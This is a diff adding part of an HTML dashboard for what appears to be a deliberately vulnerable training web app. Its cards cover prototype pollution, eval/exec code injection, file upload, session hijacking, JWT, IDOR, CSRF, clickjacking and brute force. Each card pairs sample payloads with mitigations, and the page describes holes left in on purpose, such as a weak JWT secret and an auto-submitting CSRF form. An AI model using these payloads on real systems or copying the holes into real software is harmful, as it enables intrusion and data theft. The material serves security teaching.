+              <label class="form-label">JSON Payload (merged via vulnerable deepMerge)</label>
+              <textarea class="form-textarea" id="proto-input">{"theme": "light"}</textarea>
+            </div>
+            <div class="btn-row">
+              <button class="btn btn-primary" onclick="doProtoPollute()">⛓️ Merge</button>
+              <button class="btn btn-ghost btn-sm" onclick="setInputValue('proto-input','{\"__proto__\": {\"isAdmin\": true}}')">Pollute</button>
+              <button class="btn btn-danger btn-sm" onclick="resetProto()">Reset</button>
+            </div>
+            <div class="response-viewer" id="proto-response">
+              <div class="response-tabs"><button class="response-tab active">Response</button></div>
+              <div class="response-status"><span>Status:</span><span class="response-status-text">—</span></div>
+              <div class="response-body"></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Code Injection -->
+        <div class="vuln-card" id="rce-section">
+          <div class="card-header">
+            <div class="card-icon icon-red">💻</div>
+            <div class="card-header-info">
+              <div class="card-title">Remote Code Execution (JS / Python)</div>
+              <div class="card-meta">
+                <span class="owasp-tag">OWASP A03:2021</span>
+                <span class="risk-badge risk-critical">CRITICAL</span>
+                <span class="owasp-tag">CWE-94</span>
+              </div>
+            </div>
+          </div>
+          <div class="card-body">
+            <p class="card-description">
+              JavaScript code is executed via <code>eval()</code>. Python code is run via
+              <code>child_process.exec('python3 -c ...')</code>. Both allow full system access.
+            </p>
+            <button class="expand-toggle" data-target="rce-details">
+              <span class="arrow">▶</span> Payloads
+            </button>
+            <div class="expand-content" id="rce-details">
+              <p style="font-size:11px;color:var(--text-muted);margin-bottom:4px">JavaScript (eval):</p>
+              <ul class="payload-list">
+                <li class="payload-item">
+                  <span class="payload-code" data-target="js-code">require('os').hostname()</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+                <li class="payload-item">
+                  <span class="payload-code" data-target="js-code">require('fs').readdirSync('.')</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+                <li class="payload-item">
+                  <span class="payload-code" data-target="js-code">process.env</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+              </ul>
+              <p style="font-size:11px;color:var(--text-muted);margin:8px 0 4px">Python (exec):</p>
+              <ul class="payload-list">
+                <li class="payload-item">
+                  <span class="payload-code" data-target="python-code">import os; print(os.getcwd())</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+                <li class="payload-item">
+                  <span class="payload-code" data-target="python-code">import socket; print(socket.gethostname())</span>
+                  <button class="copy-btn">📋</button>
+                </li>
+              </ul>
+              <div class="mitigation-panel">
+                <div class="mitigation-title">✅ Mitigations</div>
+                <ul class="mitigation-list">
+                  <li>Never use eval() with user input</li>
+                  <li>Use sandboxed VMs (vm2) for isolated execution</li>
+                  <li>Avoid shell execution with user data</li>
+                  <li>Use parameterized commands, not string concat</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+          <div class="card-try">
+            <div class="try-label">🧪 Try It — JavaScript eval()</div>
+            <div class="form-group">
+              <textarea class="form-textarea" id="js-code" placeholder="JavaScript expression...">1 + 1</textarea>
+            </div>
+            <div class="btn-row">
+              <button class="btn btn-primary" onclick="execJS()">▶ Execute JS</button>
+              <button class="btn btn-ghost btn-sm" onclick="setInputValue('js-code',&quot;require('os').hostname()&quot;)">Hostname</button>
+              <button class="btn btn-ghost btn-sm" onclick="setInputValue('js-code',&quot;require('fs').readdirSync('.')&quot;)">ls .</button>
+            </div>
+            <div class="response-viewer" id="jsexec-response">
+              <div class="response-tabs"><button class="response-tab active">JS Response</button></div>
+              <div class="response-status"><span>Status:</span><span class="response-status-text">—</span></div>
+              <div class="response-body"></div>
+            </div>
+
+            <div style="margin-top:16px">
+              <div class="try-label">🧪 Try It — Python exec</div>
+              <div class="form-group">
+                <textarea class="form-textarea" id="python-code" placeholder="Python code...">print('Hello from Python!')</textarea>
+              </div>
+              <div class="btn-row">
+                <button class="btn btn-primary" onclick="execPython()">🐍 Execute Python</button>
+                <button class="btn btn-ghost btn-sm" onclick="setInputValue('python-code','import os; print(os.getcwd())')">CWD</button>
+              </div>
+              <div class="response-viewer" id="pyexec-response">
+                <div class="response-tabs"><button class="response-tab active">Python Response</button></div>
+                <div class="response-status"><span>Status:</span><span class="response-status-text">—</span></div>
+                <div class="response-body"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- File Upload -->
+        <div class="vuln-card" id="upload-section">
+          <div class="card-header">
+            <div class="card-icon icon-orange">📁</div>
+            <div class="card-header-info">
+              <div class="card-title">Unrestricted File Upload</div>
+              <div class="card-meta">
+                <span class="owasp-tag">OWASP A04:2021</span>
+                <span class="risk-badge risk-high">HIGH</span>
+                <span class="owasp-tag">CWE-434</span>
+              </div>
+            </div>
+          </div>
+          <div class="card-body">
+            <p class="card-description">
+              File uploads have no MIME type validation and preserve the original filename.
+              Upload HTML/SVG files with scripts, then visit <code>/uploads/filename</code>
+              to execute stored XSS from uploaded files.
+            </p>
+            <button class="expand-toggle" data-target="upload-details">
+              <span class="arrow">▶</span> Attack Scenarios
+            </button>
+            <div class="expand-content" id="upload-details">
+              <div class="info-row"><span class="info-label">Attack</span><span class="info-value">Upload xss.html → /uploads/xss.html runs script</span></div>
+              <div class="info-row"><span class="info-label">Attack</span><span class="info-value">Upload shell.svg with embedded JS</span></div>
+              <div class="info-row"><span class="info-label">Risk</span><span class="info-value">XSS, file overwrite, path traversal in filename</span></div>
+              <div class="mitigation-panel">
+                <div class="mitigation-title">✅ Mitigations</div>
+                <ul class="mitigation-list">
+                  <li>Validate MIME type server-side (not Content-Type header)</li>
+                  <li>Rename files to random UUIDs</li>
+                  <li>Store uploads outside webroot</li>
+                  <li>Scan uploads with antivirus</li>
+                </ul>
+              </div>
+            </div>
+            <div class="file-list" id="file-list">
+              <div class="file-item" style="color:var(--text-muted)">Loading...</div>
+            </div>
+          </div>
+          <div class="card-try">
+            <div class="try-label">🧪 Try It</div>
+            <div class="form-group">
+              <label class="form-label">Select file (any type accepted)</label>
+              <input class="form-input" type="file" id="file-input" style="padding:6px" />
+            </div>
+            <div class="btn-row">
+              <button class="btn btn-primary" onclick="uploadFile()">⬆️ Upload</button>
+              <button class="btn btn-ghost btn-sm" onclick="loadFiles()">🔄 Refresh list</button>
+            </div>
+            <div class="response-viewer" id="upload-response">
+              <div class="response-tabs"><button class="response-tab active">Response</button></div>
+              <div class="response-status"><span>Status:</span><span class="response-status-text">—</span></div>
+              <div class="response-body"></div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <div class="divider"></div>
+
+    <!-- ══════════════════════════════════════════════════════════════════
+         SECTION: AUTH & SESSION
+    ══════════════════════════════════════════════════════════════════════ -->
+    <section class="section" id="session-section">
+      <div class="section-title">
+        <div class="section-title-icon icon-blue">🔐</div>
+        Authentication, Sessions & JWT
+      </div>
+      <div class="cards-grid">
+
+        <!-- Session Hijacking -->
+        <div class="vuln-card">
+          <div class="card-header">
+            <div class="card-icon icon-blue">🍪</div>
+            <div class="card-header-info">
+              <div class="card-title">Session Hijacking</div>
+              <div class="card-meta">
+                <span class="owasp-tag">OWASP A07:2021</span>
+                <span class="risk-badge risk-high">HIGH</span>
+                <span class="owasp-tag">CWE-384</span>
+              </div>
+            </div>
+          </div>
+          <div class="card-body">
+            <p class="card-description">
+              Session cookies lack <code>HttpOnly</code> and <code>Secure</code> flags, making them
+              readable via <code>document.cookie</code>. Session values can be overwritten by
+              POST request to impersonate any user.
+            </p>
+            <div style="background:rgba(79,142,247,0.06);border:1px solid rgba(79,142,247,0.2);border-radius:8px;padding:10px 14px;font-size:12px;margin-top:8px">
+              <strong style="color:var(--accent-blue)">Current Session ID:</strong>
+              <div id="session-id-display" style="font-family:monospace;margin-top:4px;color:var(--text-secondary);word-break:break-all">
+                (click Load Session)
+              </div>
+            </div>
+            <button class="expand-toggle" data-target="session-details">
+              <span class="arrow">▶</span> Details & Mitigation
+            </button>
+            <div class="expand-content" id="session-details">
+              <div class="info-row"><span class="info-label">Cookie flags</span><span class="info-value">No HttpOnly, No Secure, No SameSite</span></div>
+              <div class="info-row"><span class="info-label">Endpoint</span><span class="info-value">GET/POST /session</span></div>
+              <div class="mitigation-panel">
+                <div class="mitigation-title">✅ Mitigations</div>
+                <ul class="mitigation-list">
+                  <li>Set HttpOnly flag on session cookies</li>
+                  <li>Set Secure flag (HTTPS only)</li>
+                  <li>Set SameSite=Strict or Lax</li>
+                  <li>Regenerate session ID after login</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+          <div class="card-try">
+            <div class="try-label">🧪 Try It — Session Manipulation</div>
+            <div class="form-group">
+              <label class="form-label">Impersonate username</label>
+              <input class="form-input" id="hijack-username" placeholder="admin" value="admin" />
+            </div>
+            <div class="form-row">
+              <div class="form-group">
+                <label class="form-label">Role</label>
+                <select class="form-select" id="hijack-role">
+                  <option value="admin">admin</option>
+                  <option value="user">user</option>
+                </select>
+              </div>
+              <div class="form-group">
+                <label class="form-label">User ID</label>
+                <input class="form-input" id="hijack-userid" placeholder="1" value="1" />
+              </div>
+            </div>
+            <div class="btn-row">
+              <button class="btn btn-primary" onclick="replaceSession()">🔓 Hijack Session</button>
+              <button class="btn btn-ghost btn-sm" onclick="loadSession()">📋 Load Session Info</button>
+            </div>
+            <div class="response-viewer" id="session-response">
+              <div class="response-tabs"><button class="response-tab active">Response</button></div>
+              <div class="response-status"><span>Status:</span><span class="response-status-text">—</span></div>
+              <div class="response-body"></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Cookie Theft -->
+        <div class="vuln-card" id="cookie-section">
+          <div class="card-header">
+            <div class="card-icon icon-orange">🔍</div>
+            <div class="card-header-info">
+              <div class="card-title">Cookie Theft via XSS</div>
+              <div class="card-meta">
+                <span class="owasp-tag">OWASP A07:2021</span>
+                <span class="risk-badge risk-medium">MEDIUM</span>
+                <span class="owasp-tag">CWE-1004</span>
+              </div>
+            </div>
+          </div>
+          <div class="card-body">
+            <p class="card-description">
+              All cookies are accessible via <code>document.cookie</code> because
+              <code>HttpOnly</code> is intentionally not set. Combined with XSS,
+              an attacker can exfiltrate session cookies.
+            </p>
+            <div class="cookie-display" id="cookie-display">Loading cookies...</div>
+            <div style="margin-top:10px">
+              <strong style="font-size:11px;color:var(--text-muted)">Simulated stolen cookies:</strong>
+              <div class="cookie-display" id="stolen-cookies" style="margin-top:4px;color:var(--critical)">(click Steal Cookies)</div>
+            </div>
+            <button class="expand-toggle" data-target="cookie-details">
+              <span class="arrow">▶</span> Mitigation
+            </button>
+            <div class="expand-content" id="cookie-details">
+              <div class="mitigation-panel">
+                <div class="mitigation-title">✅ Mitigations</div>
+                <ul class="mitigation-list">
+                  <li>Set HttpOnly flag on all sensitive cookies</li>
+                  <li>Set Secure flag to prevent HTTP transmission</li>
+                  <li>Combine with XSS prevention</li>
+                  <li>Use short-lived session tokens</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+          <div class="card-try">
+            <div class="try-label">🧪 Try It</div>
+            <div class="btn-row">
+              <button class="btn btn-primary" onclick="stealCookies()">🍪 document.cookie</button>
+              <button class="btn btn-ghost btn-sm" onclick="refreshCookieDisplay?.() || location.reload()">🔄 Refresh</button>
+            </div>
+            <div class="response-viewer" id="cookie-response">
+              <div class="response-tabs"><button class="response-tab active">Response</button></div>
+              <div class="response-status"><span>Status:</span><span class="response-status-text">—</span></div>
+              <div class="response-body"></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- JWT -->
+        <div class="vuln-card" id="jwt-section">
+          <div class="card-header">
+            <div class="card-icon icon-purple">🎫</div>
+            <div class="card-header-info">
+              <div class="card-title">JWT Weaknesses</div>
+              <div class="card-meta">
+                <span class="owasp-tag">OWASP A07:2021</span>
+                <span class="risk-badge risk-high">HIGH</span>
+                <span class="owasp-tag">CWE-347</span>
+              </div>
+            </div>
+          </div>
+          <div class="card-body">
+            <p class="card-description">
+              JWTs are signed with a weak secret (<code>secret123</code>), have no expiration,
+              and the server trusts the <code>role</code> claim in the payload blindly.
+              Tokens are stored in <code>localStorage</code> (XSS accessible).
+            </p>
+            <div class="jwt-display" id="jwt-display">
+              <span class="jwt-header">[header]</span>.<span class="jwt-payload">[payload]</span>.<span class="jwt-sig">[signature]</span>
+            </div>
+            <button class="expand-toggle" data-target="jwt-details">
+              <span class="arrow">▶</span> Attack Scenarios
+            </button>
+            <div class="expand-content" id="jwt-details">
+              <div class="info-row"><span class="info-label">Secret</span><span class="info-value">secret123 (brute-forceable)</span></div>
+              <div class="info-row"><span class="info-label">Storage</span><span class="info-value">localStorage (XSS accessible)</span></div>
+              <div class="info-row"><span class="info-label">Expiry</span><span class="info-value">None (token never expires)</span></div>
+              <div class="info-row"><span class="info-label">Role trust</span><span class="info-value">Server trusts role from payload</span></div>
+              <div class="mitigation-panel">
+                <div class="mitigation-title">✅ Mitigations</div>
+                <ul class="mitigation-list">
+                  <li>Use strong, random 256-bit secrets</li>
+                  <li>Always set expiresIn (short TTL)</li>
+                  <li>Store JWTs in HttpOnly cookies, not localStorage</li>
+                  <li>Validate claims server-side, don't trust blindly</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+          <div class="card-try">
+            <div class="try-label">🧪 Try It</div>
+            <div class="form-row">
+              <div class="form-group">
+                <label class="form-label">Username</label>
+                <input class="form-input" id="jwt-username" placeholder="admin" value="admin" />
+              </div>
+              <div class="form-group">
+                <label class="form-label">Role (trusted blindly!)</label>
+                <select class="form-select" id="jwt-role">
+                  <option value="admin">admin</option>
+                  <option value="user" selected>user</option>
+                </select>
+              </div>
+            </div>
+            <div class="form-group">
+              <label class="form-label">Token (paste or auto-filled)</label>
+              <input class="form-input" id="jwt-token" placeholder="eyJ..." style="font-size:10px" />
+            </div>
+            <div class="btn-row">
+              <button class="btn btn-primary" onclick="generateJWT()">🎫 Generate JWT</button>
+              <button class="btn btn-ghost btn-sm" onclick="verifyJWT()">✅ Verify</button>
+              <button class="btn btn-ghost btn-sm" onclick="decodeJWT()">🔍 Decode</button>
+            </div>
+            <div class="response-viewer" id="jwt-response">
+              <div class="response-tabs"><button class="response-tab active">Response</button></div>
+              <div class="response-status"><span>Status:</span><span class="response-status-text">—</span></div>
+              <div class="response-body"></div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <div class="divider"></div>
+
+    <!-- ══════════════════════════════════════════════════════════════════
+         SECTION: ACCESS CONTROL
+    ══════════════════════════════════════════════════════════════════════ -->
+    <section class="section" id="bac-section">
+      <div class="section-title">
+        <div class="section-title-icon icon-red">🚪</div>
+        Access Control & CSRF
+      </div>
+      <div class="cards-grid">
+
+        <!-- Broken Access Control -->
+        <div class="vuln-card">
+          <div class="card-header">
+            <div class="card-icon icon-red">🚪</div>
+            <div class="card-header-info">
+              <div class="card-title">Broken Access Control</div>
+              <div class="card-meta">
+                <span class="owasp-tag">OWASP A01:2021</span>
+                <span class="risk-badge risk-critical">CRITICAL</span>
+                <span class="owasp-tag">CWE-285</span>
+              </div>
+            </div>
+          </div>
+          <div class="card-body">
+            <p class="card-description">
+              The admin endpoint <code>GET /api/admin</code> is "protected" only by a client-side
+              JavaScript check. The server performs no authorization. Any user can call the API directly.
+            </p>
+            <button class="expand-toggle" data-target="bac-details">
+              <span class="arrow">▶</span> Details
+            </button>
+            <div class="expand-content" id="bac-details">
+              <div class="info-row"><span class="info-label">Endpoint</span><span class="info-value">GET /api/admin</span></div>
+              <div class="info-row"><span class="info-label">Guard</span><span class="info-value">JS only: if(role !== 'admin') — trivially bypassed</span></div>
+              <div class="info-row"><span class="info-label">Exposes</span><span class="info-value">All users, comments, server info</span></div>
+              <div class="mitigation-panel">
+                <div class="mitigation-title">✅ Mitigations</div>
+                <ul class="mitigation-list">
+                  <li>Always enforce authorization server-side</li>
+                  <li>Use middleware (isAdmin, isAuthenticated)</li>
+                  <li>Never trust client-supplied role/identity</li>
+                  <li>Implement RBAC/ABAC properly</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+          <div class="card-try">
+            <div class="try-label">🧪 Try It — Client-side check bypassed</div>
+            <p style="font-size:12px;color:var(--text-muted);margin-bottom:10px">
+              Even if localStorage says you're not admin, the API still returns admin data.
+            </p>
+            <div class="btn-row">
+              <button class="btn btn-primary" onclick="accessAdmin()">🚪 Access Admin Panel</button>
+            </div>
+            <div class="response-viewer" id="bac-response">
+              <div class="response-tabs"><button class="response-tab active">Response</button></div>
+              <div class="response-status"><span>Status:</span><span class="response-status-text">—</span></div>
+              <div class="response-body"></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- IDOR -->
+        <div class="vuln-card" id="idor-section">
+          <div class="card-header">
+            <div class="card-icon icon-orange">👤</div>
+            <div class="card-header-info">
+              <div class="card-title">Insecure Direct Object Reference (IDOR)</div>
+              <div class="card-meta">
+                <span class="owasp-tag">OWASP A01:2021</span>
+                <span class="risk-badge risk-high">HIGH</span>
+                <span class="owasp-tag">CWE-639</span>
+              </div>
+            </div>
+          </div>
+          <div class="card-body">
+            <p class="card-description">
+              The profile endpoint <code>GET /api/profile?id=</code> returns any user's full
+              data including passwords without checking if the requester owns that profile.
+              Try IDs 1–5.
+            </p>
+            <button class="expand-toggle" data-target="idor-details">
+              <span class="arrow">▶</span> Details
+            </button>
+            <div class="expand-content" id="idor-details">
+              <div class="info-row"><span class="info-label">Endpoint</span><span class="info-value">GET /api/profile?id=N</span></div>
+              <div class="info-row"><span class="info-label">Also</span><span class="info-value">GET /api/users (lists ALL users)</span></div>
+              <div class="mitigation-panel">
+                <div class="mitigation-title">✅ Mitigations</div>
+                <ul class="mitigation-list">
+                  <li>Check resource ownership on every request</li>
+                  <li>Use indirect references (map IDs to objects)</li>
+                  <li>Never expose internal IDs in APIs</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+          <div class="card-try">
+            <div class="try-label">🧪 Try It</div>
+            <div class="form-group">
+              <label class="form-label">Profile ID (try 1, 2, 3, 4, 5)</label>
+              <input class="form-input" id="idor-id" type="number" min="1" value="1" />
+            </div>
+            <div class="btn-row">
+              <button class="btn btn-primary" onclick="fetchProfile()">👤 Fetch Profile</button>
+              <button class="btn btn-ghost btn-sm" onclick="apiCall('GET','/api/users',null,'idor-response')">List All Users</button>
+            </div>
+            <div class="response-viewer" id="idor-response">
+              <div class="response-tabs"><button class="response-tab active">Response</button></div>
+              <div class="response-status"><span>Status:</span><span class="response-status-text">—</span></div>
+              <div class="response-body"></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- CSRF -->
+        <div class="vuln-card" id="csrf-section">
+          <div class="card-header">
+            <div class="card-icon icon-pink">🔄</div>
+            <div class="card-header-info">
+              <div class="card-title">Cross-Site Request Forgery (CSRF)</div>
+              <div class="card-meta">
+                <span class="owasp-tag">OWASP A01:2021</span>
+                <span class="risk-badge risk-medium">MEDIUM</span>
+                <span class="owasp-tag">CWE-352</span>
+              </div>
+            </div>
+          </div>
+          <div class="card-body">
+            <p class="card-description">
+              The <code>POST /transfer</code> endpoint has no CSRF token, no SameSite cookie
+              protection. A malicious page can auto-submit a form to perform actions on
+              behalf of a logged-in user.
+            </p>
+            <button class="expand-toggle" data-target="csrf-details">
+              <span class="arrow">▶</span> Demo Attack
+            </button>
+            <div class="expand-content" id="csrf-details">
+              <div class="info-row"><span class="info-label">Endpoint</span><span class="info-value">POST /transfer</span></div>
+              <div class="info-row"><span class="info-label">Missing</span><span class="info-value">CSRF token, SameSite cookie, Origin check</span></div>
+              <p style="font-size:11px;color:var(--text-muted);margin:8px 0 4px">Attack page HTML:</p>
+              <div style="background:rgba(0,0,0,0.3);border-radius:6px;padding:8px;font-family:monospace;font-size:10px;color:var(--accent-teal)">
+                &lt;form action="http://localhost:3000/transfer" method="POST"&gt;<br>
+                &nbsp;&lt;input name="to" value="attacker"&gt;<br>
+                &nbsp;&lt;input name="amount" value="9999"&gt;<br>
+                &lt;/form&gt;<br>
+                &lt;script&gt;document.forms[0].submit()&lt;/script&gt;
+              </div>
+              <div class="mitigation-panel" style="margin-top:8px">
+                <div class="mitigation-title">✅ Mitigations</div>
+                <ul class="mitigation-list">
+                  <li>Use CSRF tokens (synchronizer pattern)</li>
+                  <li>Set SameSite=Strict on cookies</li>
+                  <li>Validate Origin/Referer headers</li>
+                  <li>Use double-submit cookie pattern</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+          <div class="card-try">
+            <div class="try-label">🧪 Try It</div>
+            <div class="form-row">
+              <div class="form-group">
+                <label class="form-label">Amount</label>
+                <input class="form-input" id="csrf-amount" type="number" value="9999" />
+              </div>
+              <div class="form-group">
+                <label class="form-label">To (recipient)</label>
+                <input class="form-input" id="csrf-to" value="attacker" />
+              </div>
+            </div>
+            <div class="btn-row">
+              <button class="btn btn-primary" onclick="doCSRF()">💸 Transfer (No CSRF Token)</button>
+              <button class="btn btn-ghost btn-sm" onclick="openCSRFDemo()">🌐 Open Attack Page</button>
+            </div>
+            <div class="response-viewer" id="csrf-response">
+              <div class="response-tabs"><button class="response-tab active">Response</button></div>
+              <div class="response-status"><span>Status:</span><span class="response-status-text">—</span></div>
+              <div class="response-body"></div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <div class="divider"></div>
+
+    <!-- ══════════════════════════════════════════════════════════════════
+         SECTION: CLIENT-SIDE / RATE LIMITING
+    ══════════════════════════════════════════════════════════════════════ -->
+    <section class="section" id="clickjack-section">
+      <div class="section-title">
+        <div class="section-title-icon icon-teal">🖼️</div>
+        Client-Side & Miscellaneous
+      </div>
+      <div class="cards-grid">
+
+        <!-- Clickjacking -->
+        <div class="vuln-card">
+          <div class="card-header">
+            <div class="card-icon icon-teal">🖼️</div>
+            <div class="card-header-info">
+              <div class="card-title">Clickjacking / Cross-Frame Scripting</div>
+              <div class="card-meta">
+                <span class="owasp-tag">OWASP A05:2021</span>
+                <span class="risk-badge risk-medium">MEDIUM</span>
+                <span class="owasp-tag">CWE-1021</span>
+              </div>
+            </div>
+          </div>
+          <div class="card-body">
+            <p class="card-description">
+              No <code>X-Frame-Options</code> or <code>Content-Security-Policy: frame-ancestors</code>
+              headers are set, allowing this page to be embedded in an iframe. Also demonstrates
+              insecure postMessage with wildcard origin (<code>*</code>).
+            </p>
+            <button class="expand-toggle" data-target="clickjack-details">
+              <span class="arrow">▶</span> Details
+            </button>
+            <div class="expand-content" id="clickjack-details">
+              <div class="info-row"><span class="info-label">Missing</span><span class="info-value">X-Frame-Options, CSP frame-ancestors</span></div>
+              <div class="info-row"><span class="info-label">postMessage</span><span class="info-value">Sends/receives with wildcard origin '*'</span></div>
+              <p style="font-size:11px;color:var(--text-muted);margin:8px 0 4px">XFS Message Tester:</p>
+              <div class="form-group">
+                <input class="form-input" id="xfs-message" placeholder="Message to send to iframe" value="Hello iframe!" />
+              </div>
+              <div class="btn-row">
+                <button class="btn btn-ghost btn-sm" onclick="postMessageToFrame()">📨 Send postMessage</button>
+              </div>
+              <div style="font-size:11px;color:var(--text-muted);margin-top:6px">
+                Sent: <span id="xfs-sent" style="color:var(--accent-teal)">—</span><br>
+                Received: <span id="xfs-received" style="color:var(--accent-orange)">—</span>
+              </div>
+              <div class="mitigation-panel" style="margin-top:8px">
+                <div class="mitigation-title">✅ Mitigations</div>
+                <ul class="mitigation-list">
+                  <li>Set X-Frame-Options: DENY or SAMEORIGIN</li>
+                  <li>Set CSP: frame-ancestors 'self'</li>
+                  <li>Validate postMessage origin explicitly</li>
+                </ul>
+              </div>
+            </div>
+            <div class="iframe-demo">
+              <iframe id="clickjacking-iframe" src="about:blank" sandbox="allow-scripts allow-same-origin allow-forms"></iframe>
+              <iframe id="xfs-iframe" src="about:blank" style="display:none"></iframe>
+            </div>
+          </div>
+          <div class="card-try">
+            <div class="try-label">🧪 Try It — Load in iframe</div>
+            <div class="form-group">
+              <label class="form-label">URL to embed</label>
+              <input class="form-input" id="iframe-url" placeholder="http://localhost:3000" value="http://localhost:3000" />
+            </div>
+            <div class="btn-row">
+              <button class="btn btn-primary" onclick="loadIframe()">🖼️ Embed in iframe</button>
+              <button class="btn btn-ghost btn-sm" onclick="document.getElementById('clickjacking-iframe').src='about:blank'">Clear</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Rate Limiting -->
+        <div class="vuln-card" id="ratelimit-section">
+          <div class="card-header">
+            <div class="card-icon icon-yellow">🏃</div>
+            <div class="card-header-info">
+              <div class="card-title">Lack of Rate Limiting</div>
+              <div class="card-meta">
+                <span class="owasp-tag">OWASP A04:2021</span>
+                <span class="risk-badge risk-medium">MEDIUM</span>
+                <span class="owasp-tag">CWE-307</span>
+              </div>
+            </div>
+          </div>
+          <div class="card-body">
+            <p class="card-description">
+              The login endpoint accepts unlimited requests with no delay, no CAPTCHA,
+              and no lockout. Credentials can be brute-forced at thousands of requests per second.
+            </p>
+            <div class="attempt-display" style="margin-top:0">
+              <span>🎯 Total Attempts:</span>
+              <span class="attempt-count" id="attempt-counter-2">0</span>
+              <span style="color:var(--text-muted);font-size:11px;margin-left:auto">No rate limiting!</span>
+            </div>
+            <button class="expand-toggle" data-target="rate-details">
+              <span class="arrow">▶</span> Details & Mitigation
+            </button>
+            <div class="expand-content" id="rate-details">
+              <div class="info-row"><span class="info-label">No lockout</span><span class="info-value">Unlimited attempts</span></div>
+              <div class="info-row"><span class="info-label">No CAPTCHA</span><span class="info-value">Automatable</span></div>
+              <div class="info-row"><span class="info-label">No delay</span><span class="info-value">Instant responses</span></div>
+              <div class="mitigation-panel">
+                <div class="mitigation-title">✅ Mitigations</div>
+                <ul class="mitigation-list">
+                  <li>Implement rate limiting (express-rate-limit)</li>
+                  <li>Add progressive delays after failures</li>
+                  <li>Implement account lockout after N attempts</li>
+                  <li>Use CAPTCHA for automated login protection</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+          <div class="card-try">
+            <div class="try-label">🧪 Brute Force Simulator</div>
+            <p style="font-size:12px;color:var(--text-muted);margin-bottom:10px">
+              Sends 10 rapid login attempts to demonstrate no rate limiting.
+            </p>
+            <div class="btn-row">
+              <button class="btn btn-primary" onclick="bruteForceDemo()">🏃 Brute Force (10 attempts)</button>
+              <button class="btn btn-danger btn-sm" onclick="resetAttempts()">Reset Counter</button>
+            </div>
+            <div id="brute-log" class="terminal-output" style="margin-top:10px;min-height:80px"></div>
+          </div>
+        </div>
+
+        <!-- Storage Display -->
+        <div class="vuln-card" id="storage-section">
+          <div class="card-header">
+            <div class="card-icon icon-blue">💽</div>
+            <div class="card-header-info">
+              <div class="card-title">localStorage / sessionStorage / Cookies</div>
+              <div class="card-meta">
+                <span class="owasp-tag">OWASP A02:2021</span>
+                <span class="risk-badge risk-low">LOW</span>
+                <span class="owasp-tag">CWE-312</span>
+              </div>
+            </div>
+          </div>
+          <div class="card-body">
+            <p class="card-description">
+              Sensitive data (JWT tokens, API keys, usernames) are stored insecurely in
+              <code>localStorage</code>. All values are accessible to any JavaScript
+              running on the page (XSS pivotable).
+            </p>
+            <div style="font-size:11px;font-weight:700;color:var(--text-muted);margin-bottom:6px;text-transform:uppercase;letter-spacing:0.5px">
+              📦 localStorage
+            </div>
+            <div class="storage-grid" id="localstorage-grid"></div>
+            <div style="font-size:11px;font-weight:700;color:var(--text-muted);margin:12px 0 6px;text-transform:uppercase;letter-spacing:0.5px">
+              🗂 sessionStorage
+            </div>
+            <div class="storage-grid" id="sessionstorage-grid"></div>
+          </div>
+          <div class="card-try">
+            <div class="try-label">🧪 Try It</div>
+            <div class="btn-row">
+              <button class="btn btn-primary" onclick="refreshStorage()">🔄 Refresh All</button>
+              <button class="btn btn-ghost btn-sm" onclick="generateJWT()">🎫 Store JWT</button>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <div class="divider"></div>
+
+    <!-- ══════════════════════════════════════════════════════════════════
+         SECTION: INFORMATION DISCLOSURE & API
+    ══════════════════════════════════════════════════════════════════════ -->
+    <section class="section" id="info-section">
+      <div class="section-title">
+        <div class="section-title-icon icon-blue">ℹ️</div>
+        Information Disclosure & API Discovery
+      </div>
+      <div class="cards-grid">
+
+        <!-- Info Disclosure -->
+        <div class="vuln-card">
+          <div class="card-header">
+            <div class="card-icon icon-blue">ℹ️</div>
+            <div class="card-header-info">
+              <div class="card-title">Information Disclosure</div>
+              <div class="card-meta">
+                <span class="owasp-tag">OWASP A05:2021</span>
+                <span class="risk-badge risk-medium">MEDIUM</span>
+                <span class="owasp-tag">CWE-200</span>
+              </div>
+            </div>
+          </div>
+          <div class="card-body">
+            <p class="card-description">
+              Server exposes version numbers, framework details, platform info, file paths,
+              and PIDs via response headers and <code>/api/info</code>. Error responses
+              include full stack traces.
+            </p>
+            <button class="expand-toggle" data-target="info-details">
+              <span class="arrow">▶</span> Exposed Information
+            </button>
+            <div class="expand-content" id="info-details">
+              <div class="info-row"><span class="info-label">Headers</span><span class="info-value">X-Powered-By, Server, X-App-Version</span></div>
+              <div class="info-row"><span class="info-label">Endpoint</span><span class="info-value">GET /api/info</span></div>
+              <div class="info-row"><span class="info-label">Exposes</span><span class="info-value">Node version, Express version, CWD, PID</span></div>
+              <div class="info-row"><span class="info-label">Errors</span><span class="info-value">Full stack traces in responses</span></div>
+              <div class="mitigation-panel">
+                <div class="mitigation-title">✅ Mitigations</div>
+                <ul class="mitigation-list">
+                  <li>Remove or sanitize server headers</li>
+                  <li>Use generic error messages in production</li>
+                  <li>Log stack traces server-side only</li>
+                  <li>Never expose internal paths or versions</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+          <div class="card-try">
+            <div class="try-label">🧪 Try It</div>
+            <div class="btn-row">
+              <button class="btn btn-primary" onclick="fetchInfo()">ℹ️ Get Server Info</button>
+            </div>
+            <div class="response-viewer" id="info-response">
+              <div class="response-tabs"><button class="response-tab active">Response</button></div>
+              <div class="response-status"><span>Status:</span><span class="response-status-text">—</span></div>
+              <div class="response-body"></div>
+            </div>
